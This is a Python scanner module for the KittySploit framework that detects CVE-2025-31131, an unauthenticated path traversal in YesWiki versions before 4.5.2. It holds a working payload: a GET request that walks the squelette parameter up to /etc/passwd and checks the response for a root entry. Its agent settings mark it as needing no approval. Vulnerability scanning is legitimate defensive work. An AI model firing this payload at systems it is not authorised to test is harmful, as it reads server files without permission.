#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki is a wiki system written in PHP."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yeswiki < 4.5.2 - Unauthenticated Path Traversal Detection',
        'description': 'YesWiki is a wiki system written in PHP. The squelette parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'yeswiki', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-w34w-fvp3-68xm',
            'https://github.com/YesWiki/yeswiki/commit/f78c915369a60c74ab8f38561ae93a4aaca9b989',
            'https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w34w-fvp3-68xm',
        ],
        'cve': 'CVE-2025-31131',
    }

    def run(self):
        path = '/?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('YesWiki-main',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Yeswiki < 4.5.2 - Unauthenticated Path Traversal detected', path=path)
            return True
        return False

